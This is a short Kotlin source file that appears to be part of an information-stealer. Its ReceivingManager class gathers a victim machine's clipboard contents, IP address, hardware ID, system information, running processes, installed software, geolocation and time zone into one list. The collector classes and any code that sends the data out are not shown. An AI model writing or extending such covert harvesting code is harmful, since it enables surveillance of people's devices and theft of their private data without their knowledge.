package maven.example.com.receiving

import maven.example.com.receiving.system.*
import maven.example.com.utility.data.Receipt
import maven.example.com.utility.data.Data
import java.util.function.Consumer

class ReceivingManager {
    companion object {
        fun receiving(): MutableList<Data?> {
            val receipts: MutableList<Receipt?> = ArrayList()
            val list: MutableList<Data?> = ArrayList()

            // System
            receipts.add(Clipboard())
            receipts.add(IP())
            receipts.add(Hwid())
            receipts.add(SystemInformationJava())
            receipts.add(ProcessList())
            receipts.add(InstalledSoftware())
            receipts.add(Location())
            receipts.add(TimeZone())

            receipts.forEach(Consumer { receipt: Receipt? -> list.add(receipt!!.data) })
            return list
        }
    }
}